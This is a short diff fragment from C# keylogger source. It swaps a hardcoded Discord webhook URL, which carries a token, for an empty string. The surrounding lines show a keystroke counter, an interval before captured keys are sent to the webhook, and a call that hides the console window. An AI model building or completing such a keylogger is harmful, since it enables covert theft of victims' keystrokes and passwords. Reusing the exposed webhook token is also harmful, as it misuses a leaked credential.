@@ -10,7 +10,7 @@ namespace Keylogger
     {
         public static int N_KEY = 0; // Number of keys written
         public static int INTERVAL = 100; // Interval before sending discord webhook
-        public static readonly string DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1055550829416960020/5XNmr-xCq3an73LZVknB33Ya3cBMQwkL6sJeffNtBYO8iqvwJfUSbD2DlVnbWyK1omKK"; // Discord Webhook Url here
+        public static readonly string DISCORD_WEBHOOK = ""; // Discord Webhook Url here
         static async Task Main(string[] args)
         {
             ConsoleExtension.Hide(); // Change to Show() to show the console
